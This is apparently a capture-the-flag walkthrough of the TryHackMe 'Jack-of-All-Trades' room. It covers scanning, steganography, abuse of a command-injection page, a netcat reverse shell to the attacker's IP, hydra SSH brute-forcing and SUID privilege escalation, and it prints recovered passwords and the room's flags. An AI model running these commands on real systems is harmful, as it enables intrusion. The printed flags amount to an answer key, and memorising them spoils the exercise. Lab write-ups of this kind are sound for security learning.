# [Jack-of-All-Trades](https://tryhackme.com/room/jackofalltrades)

> Boot-to-root originally designed for Securi-Tay 2020

## Scanning

scan the target

```
nmap -sS -sV -T4 10.10.221.94
```

![image](https://user-images.githubusercontent.com/90561566/216546687-585ed721-ae23-4569-8122-3adda13aa9b2.png)

hmm, there is a paradox here when http at port 22 and ssh port 80

## HTTP

view the webpage

![image](https://user-images.githubusercontent.com/90561566/216547112-c7dd7421-8f6c-4571-9216-39ccdd204ef0.png)

To resolve this issue do the following:
1. In the URL bar, enter about:config.
2. In the search bar, enter network.security.ports.banned.override
3. Select type String and click on the + sign to add.
4. Enter the port number 22.

![image](https://user-images.githubusercontent.com/90561566/216547647-c779a6d1-2e89-4a94-982a-0a0991096ccf.png)

go back the webpage

![image](https://user-images.githubusercontent.com/90561566/216547798-f3444667-51aa-42cd-913e-763cd0bf1c52.png)

you can found a note at the source code

![image](https://user-images.githubusercontent.com/90561566/216548407-27cf37cf-4aac-4ada-ac95-ec75880737fc.png)

it seem a base64, we have a password `u?WtKSraq`

![image](https://user-images.githubusercontent.com/90561566/216548706-7e2fad34-a1c2-4295-b07d-af99d7f8a905.png)

go to /recovery.php, i see a login page

![image](https://user-images.githubusercontent.com/90561566/216549236-a131e8cd-8a30-4f3d-a1e6-a326031af61b.png)

there is still a note at source code

![image](https://user-images.githubusercontent.com/90561566/216549600-1278eab5-19a1-4b63-b9a2-eea425e796db.png)

## Enumeration

this is a multi encrypted string that can be decoded by Base32 > Hex > Rot 13

![image](https://user-images.githubusercontent.com/90561566/216550070-87723d4d-e55c-4a00-b347-c36d22ed9cae.png)

we have a shortened url that redirect to wikipedia related to Stegosauria

![image](https://user-images.githubusercontent.com/90561566/216550282-f33acd0b-c748-4e47-9f66-a5582c301253.png)

remember he like Stego's and there is an image of a dinosaur on the homepage as well, so the hint may be steganography

```
wget http://10.10.221.94:22/assets/stego.jpg
steghide extract -sf stego.jpg
```

passphare is the previous found `u?WtKSraq`

![image](https://user-images.githubusercontent.com/90561566/216552104-aa0476fe-656b-4081-91e1-3d48ae638a58.png)

wrong image, so do the following with 3 image at homepage, and the answer is header.jpg

```
wget http://10.10.221.94:22/assets/header.jpg
steghide extract -sf header.jpg
```

![image](https://user-images.githubusercontent.com/90561566/216552499-bd91fda3-e0bb-4e1d-8070-5a6aaaecbfdd.png)

now, return the recover.php and we will see a command page

![image](https://user-images.githubusercontent.com/90561566/216552820-d84b5158-e811-44b8-92be-d24544abd102.png)

try a basic command `?cmd=whoami`

![image](https://user-images.githubusercontent.com/90561566/216552949-70f0f8a7-1d89-42a1-96b9-ef1be8032266.png)

## Exploitation

now just prepare a netcat

```
nc -vlnp 4444
```

create a reverse shell

```
?cmd=nc -e /bin/sh 10.9.43.204 4444
```

![image](https://user-images.githubusercontent.com/90561566/216557546-a9d64505-db2c-4f25-8802-fc29ac787541.png)

```
cd /home
ls -la
cat jacks_password_list
```

we can user that passlist to crack jack ssh

```
hydra -l jack -P passlist.txt 10.10.116.58 ssh -s 80
```

![image](https://user-images.githubusercontent.com/90561566/216558597-c8f53cc3-af5e-4ef3-9e79-414c8ad1e490.png)

```
ssh jack@10.10.116.58 -p 80
ITMJpGGIqg1jn?>@
```

![image](https://user-images.githubusercontent.com/90561566/216558829-cb54f803-86c1-49f8-88bf-22e65842cdd7.png)

the flag is image so i use scp to copy to local machine

```
scp -P 80 jack@10.10.116.58:user.jpg .
```

![image](https://user-images.githubusercontent.com/90561566/216559630-aae80783-4c14-4437-97d5-a4069d18ee64.png)

```
open user.jpg
```

![image](https://user-images.githubusercontent.com/90561566/216559866-a3fddd20-3b09-4e4d-8976-b1ea2d9a2d79.png)

| Flag | user.jpg |
| --- | --- |
| Answer | securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3} |

## Privilege Escalation

search for SUID bit

```
find / -perm /4000 -user root -ls 2>/dev/null
```

![image](https://user-images.githubusercontent.com/90561566/216560677-33e9864c-0c60-4d13-a235-b6d99d36bb16.png)

it's very easy with strings

```
strings /root/root.txt
```

![image](https://user-images.githubusercontent.com/90561566/216561156-efed67c3-d022-4129-a4c7-692906976357.png)

| Flag | root.txt |
| --- | --- |
| Answer | securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a} |
